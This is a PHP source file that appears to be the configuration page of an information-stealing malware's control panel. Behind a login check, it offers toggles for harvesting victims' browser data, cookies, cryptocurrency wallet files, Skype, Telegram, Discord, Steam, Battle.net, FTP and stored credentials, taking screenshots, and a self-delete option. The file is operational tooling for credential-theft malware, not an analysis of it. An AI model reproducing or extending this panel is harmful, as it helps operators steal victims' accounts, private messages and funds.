<?php
    session_start();
    if (!isset($_SESSION['username']))
    {
        header("Location: login.php");
        die();
    }
?>

<!DOCTYPE html>
<html>
	<head>
		
        <link rel="shortcut icon" type="image/png" href="img/favicon.png">
		<link rel="stylesheet" type="text/css" href="css/jquery.fancybox.min.css">

        <script type="text/javascript" src="js/jquery-3.3.1.min.js"></script>
		<script type="text/javascript" src="js/jquery.fancybox.min.js"></script>
	</head>

	<body>
        <?php
            $type = "settings";
            include("nav_bar.php");
            $info = parse_ini_file("config.txt");
            foreach($info as $key => $value)
            {
                if ($value == 1) $info[$key] = 'checked';
                else $info[$key] = '';
            }
        ?>

		<div class="col-md-9">
			<div class="row">

                <form id="config_action">
                    <p class="content-subheading select-block">
                        Chromium-Based
                        <input type="checkbox" <?php print($info['chromium']); ?> class="content-checkbox" name="chromium" />
                    </p>

                    <p class="content-subheading select-block">
                        Mozilla-Based
                        <input type="checkbox" <?php print($info['mozilla']); ?> class="content-checkbox" name="mozilla" />
                    </p>

                    <p class="content-subheading select-block">
                        Wininet Cookies
                        <input type="checkbox" <?php print($info['wininetCookies']); ?> class="content-checkbox" name="wininetCookies" />
                    </p>

                    <p class="content-subheading select-block">
                        Cryptocurrency Client Files
                        <input type="checkbox" <?php print($info['crypto']); ?> class="content-checkbox" name="crypto" />
                    </p>

                    <p class="content-subheading select-block">
                        Skype History
                        <input type="checkbox" <?php print($info['skype']); ?> class="content-checkbox" name="skype" />
                    </p>

                    <p class="content-subheading select-block">
                        Telegram
                        <input type="checkbox" <?php print($info['telegram']); ?> class="content-checkbox" name="telegram" />
                    </p>

                    <p class="content-subheading select-block">
                        Discord
                        <input type="checkbox" <?php print($info['discord']); ?> class="content-checkbox" name="discord" />
                    </p>

                    <p class="content-subheading select-block">
                        Battle.Net
                        <input type="checkbox" <?php print($info['battlenet']); ?> class="content-checkbox" name="battlenet" />
                    </p>
					
					<p class="content-subheading select-block">
                        Internet Explorer
                        <input type="checkbox" <?php print($info['iexplore']); ?> class="content-checkbox" name="iexplore" />
                    </p>
                    
                    <p class="content-subheading select-block">
                        Steam Files
                        <input type="checkbox" <?php print($info['steam']); ?> class="content-checkbox" name="steam" />
                    </p>

                    <p class="content-subheading select-block">
                        Screenshot
                        <input type="checkbox" <?php print($info['screenshot']); ?> class="content-checkbox" name="screenshot" />
                    </p>

                    <p class="content-subheading select-block">
                        FTP
                        <input type="checkbox" <?php print($info['ftp']); ?> class="content-checkbox" name="ftp" />
                    </p>

                    <p class="content-subheading select-block">
                        Credentials Data
                        <input type="checkbox" <?php print($info['credentials']); ?> class="content-checkbox" name="credentials" />
                    </p>

                    <p class="content-subheading select-block">
                        Jabber
                        <input type="checkbox" <?php print($info['jabber']); ?> class="content-checkbox" name="jabber" />
                    </p>

                    <p class="content-subheading select-block">
                        Self-Delete
                        <input type="checkbox" <?php print($info['selfDelete']); ?> class="content-checkbox" name="selfDelete" />
                    </p>

                    <center>
                        <button type="submit" style="margin-top:30px;width:200px;height:25px">
                            Set configuration
                        </button>
                    </center>
                </form>

                <script>
                  $('#config_action').submit(function() {
                      var post_data = $('#config_action').serialize();
                      $.post('config.php', post_data, function(data) {
                        $('#notification').show();
                  });
                });
                </script>
			</div>
		</div>

		<script type="text/javascript">
			$(document).ready(function() {
				var margin = ($("#stats-block").outerWidth() - ($("#counter-1").width() + $("#counter-2").width()) - 20) / 2;
				var height = $("html").outerHeight();
				$("#counters-block").css("padding-left", margin);
				$(".menu").css("height", height);
			});
		</script>
	</body>
</html>